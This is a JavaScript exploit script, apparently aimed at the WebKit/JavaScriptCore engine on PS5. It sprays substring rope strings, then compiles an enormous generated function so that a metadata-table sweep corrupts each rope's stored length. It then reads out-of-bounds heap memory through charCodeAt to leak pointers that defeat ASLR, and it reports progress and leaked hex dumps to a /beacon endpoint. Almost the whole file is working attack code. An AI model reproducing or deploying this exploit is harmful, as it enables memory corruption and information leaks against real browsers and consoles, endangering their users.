// V408 - Substring Rope OOB Read via MetadataTable sweep
//
// Target: JSRopeString.CompactFibers.m_length at cell offset 16
// Cell layout (32 bytes):
//   0-7:   JSCell header (StructureID + flags)
//   8-15:  m_fiber (base ptr | isRope=1 | isSubstring=2 | is8Bit=4)
//   16-19: CompactFibers::m_length  <-- CORRUPTION TARGET
//   20-23: m_fiber1Lower (substringOffset low)
//   24-25: m_fiber1Upper
//   26-27: m_fiber2Lower
//   28-31: m_fiber2Upper
//
// Sweep writes per 112-byte entry:
//   0-11:  zeros (PackedRawSentinelNode)
//   12-15: 0xFFFFFFFF (m_slowPathCount)
//   24-31: thunk code pointer (ASLR leak)
//   64-67: bit fields
//   68-71: bytecodeIndex (sequential)
//
// If cell+16 aligns with entry+24: m_length = low 4 bytes of thunk ptr (large)
// If cell+16 aligns with entry+68: m_length = bytecodeIndex (sequential, >893)
// Either way: corrupted m_length > base string length -> charCodeAt reads OOB
//
// charCodeAt path for substring rope (JSString.h:1122):
//   pointer = base.characters8() + substringOffset()
//   length = CompactFibers::m_length (NOT base length!)
//   Returns pointer[index] with ASSERT-only bounds check (stripped on PS5)

(function() {
  'use strict';
  var qc = 0;
  function B(m) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V408-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++), false);
      x.send('');
    } catch(e) {}
  }

  B('START');

  // ===== PHASE 1: Create base strings =====
  // Each base string goes into FastMalloc (StringImpl).
  // The substring rope cells go into MarkedSpace.
  // Use 50000-char strings so StringImpl is in marge tier.
  var BASE_LEN = 50000;
  var BASE_COUNT = 20;
  var baseStrings = [];

  for (var i = 0; i < BASE_COUNT; i++) {
    var s = '';
    // Fill with identifiable pattern: repeating 'A' + index char
    var fillChar = String.fromCharCode(0x41 + (i % 26));
    for (var j = 0; j < BASE_LEN; j++) s += fillChar;
    baseStrings.push(s);
  }
  B('BASES-' + baseStrings.length + '-LEN-' + BASE_LEN);

  // ===== PHASE 2: Spray substring ropes =====
  // substring(0, len) creates a ROPE that points to the same StringImpl
  // but has its own CompactFibers::m_length in the rope cell.
  var ROPE_COUNT = 60000;
  var ropes = [];

  for (var i = 0; i < ROPE_COUNT; i++) {
    var baseIdx = i % BASE_COUNT;
    // Create substring rope (NOT resolved -- stays as rope cell in MarkedSpace)
    var sub = baseStrings[baseIdx].substring(0, BASE_LEN);
    ropes.push(sub);
  }
  B('ROPES-' + ropes.length);

  // Verify ropes are alive
  var ropeOk = 0;
  for (var i = 0; i < Math.min(100, ropes.length); i++) {
    if (ropes[i].length === BASE_LEN) ropeOk++;
  }
  B('VERIFY-' + ropeOk + 'of100');

  // ===== PHASE 3: GC compaction =====
  for (var i = 0; i < 10; i++) {
    var tmp = [];
    for (var j = 0; j < 5000; j++) tmp.push({});
    tmp = null;
  }
  var fr = new FinalizationRegistry(function(){});
  for (var i = 0; i < 100; i++) fr.register({}, 'gc' + i);
  B('GC-DONE');

  // ===== PHASE 4: Build and load IIFE =====
  B('BUILD');
  var N = 38348816;
  // Array.join approach for faster string building
  var piece = '';
  for (var i = 0; i < 1000; i++) piece += 'a();';
  var needed = Math.ceil(N / 1000);
  var parts = new Array(needed);
  for (var i = 0; i < needed; i++) parts[i] = piece;
  var calls = parts.join('');
  parts = null;
  piece = null;

  var code = '(function(a){if(window.____xV408){' + calls + '}})(function(){})';
  calls = null;
  B('CODE-' + Math.round(code.length / 1048576) + 'MB');

  try {
    var blob = new Blob([code], { type: 'application/javascript' });
    code = null;
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');

    var url = URL.createObjectURL(blob);
    var s = document.createElement('script');
    s.src = url;

    s.onload = function() {
      B('COMPILED-OK');
      URL.revokeObjectURL(url);
      checkRopes();
    };

    s.onerror = function() {
      B('COMPILE-ERR');
      checkRopes();
    };

    document.head.appendChild(s);
  } catch(e) {
    B('BUILD-ERR-' + e.message.substring(0, 80));
    checkRopes();
  }

  // ===== PHASE 5: Check rope corruption =====
  function checkRopes() {
    B('CHECK');

    var corrupted = 0;
    var oobReads = 0;
    var zeroed = 0;

    for (var i = 0; i < ropes.length; i++) {
      var rope = ropes[i];
      var len;

      try {
        len = rope.length;
      } catch(e) {
        if (corrupted < 5) B('LEN-ERR-' + i);
        corrupted++;
        continue;
      }

      if (len !== BASE_LEN) {
        corrupted++;

        if (len === 0) {
          zeroed++;
          if (zeroed <= 3) B('ZEROED-' + i);
          continue;
        }

        // m_length was corrupted!
        if (corrupted <= 30) {
          B('C-' + i + '-L' + len);
        }

        // If length INCREASED, we can read OOB past the base string's data!
        if (len > BASE_LEN && len < 100000000) {
          oobReads++;

          if (oobReads <= 10) {
            // Read past the base string to leak heap data
            var leaked = [];
            var readStart = BASE_LEN;
            var readEnd = Math.min(len, BASE_LEN + 64);

            for (var j = readStart; j < readEnd; j++) {
              try {
                var code = rope.charCodeAt(j);
                leaked.push(code);
              } catch(e) {
                leaked.push(-1);
                break;
              }
            }

            // Format as hex pairs
            var hexDump = '';
            for (var k = 0; k < leaked.length; k++) {
              if (leaked[k] >= 0) {
                var h = leaked[k].toString(16);
                hexDump += (h.length < 2 ? '0' : '') + h;
              } else {
                hexDump += 'XX';
              }
            }
            B('OOB-' + i + '-FROM' + readStart + '-' + hexDump);

            // Check for pointer patterns (8 bytes with structure)
            if (leaked.length >= 8) {
              var ptrs = [];
              for (var p = 0; p < leaked.length - 7; p += 8) {
                var nontrivial = 0;
                for (var b = 0; b < 8; b++) {
                  if (leaked[p + b] > 0 && leaked[p + b] < 256 && leaked[p + b] !== 0x41) nontrivial++;
                }
                if (nontrivial >= 4) {
                  var pstr = '';
                  for (var b = 0; b < 8; b++) {
                    var hb = leaked[p + b].toString(16);
                    pstr += (hb.length < 2 ? '0' : '') + hb;
                  }
                  ptrs.push('O' + (readStart + p) + ':' + pstr);
                }
              }
              if (ptrs.length > 0 && oobReads <= 5) {
                B('PTRS-' + i + '-' + ptrs.slice(0, 4).join('|'));
              }
            }
          }
        }

        // If length decreased, report that too (sweep zeros or bit field writes)
        if (len < BASE_LEN && len > 0 && corrupted <= 20) {
          B('SHRUNK-' + i + '-L' + len);
        }
      }
    }

    B('RESULT-C' + corrupted + '-OOB' + oobReads + '-Z' + zeroed + '-T' + ropes.length);

    // If we got OOB reads, try write test (set charCodeAt via rope.substring)
    if (oobReads > 0) {
      B('OOB-SUCCESS');
      // Report the corrupted m_length value as hex for analysis
      for (var i = 0; i < ropes.length && i < 3; i++) {
        if (ropes[i].length > BASE_LEN) {
          var ml = ropes[i].length;
          B('MLEN-' + i + '-0x' + (ml >>> 0).toString(16) + '-DEC' + ml);
        }
      }
    }

    B('DONE');
  }
})();
